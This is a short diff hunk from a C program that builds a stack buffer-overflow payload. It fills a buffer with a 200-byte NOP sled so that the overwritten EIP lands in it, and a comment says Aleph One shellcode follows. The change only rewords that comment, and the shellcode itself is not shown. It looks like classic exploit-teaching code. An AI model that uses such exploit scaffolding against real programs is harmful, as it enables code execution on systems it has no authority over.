@@ -14,7 +14,7 @@ int main(void)
   char buf[248];
 
   //Steps
-  //1. add noop sled for 200 or more/less but give a safe no so that eip falls into noop
+  //1. add noop sled so that eip falls into noop for safe landing
   memset(buf, NOOP, 200);
 
   //2. add shellcode from alephone 
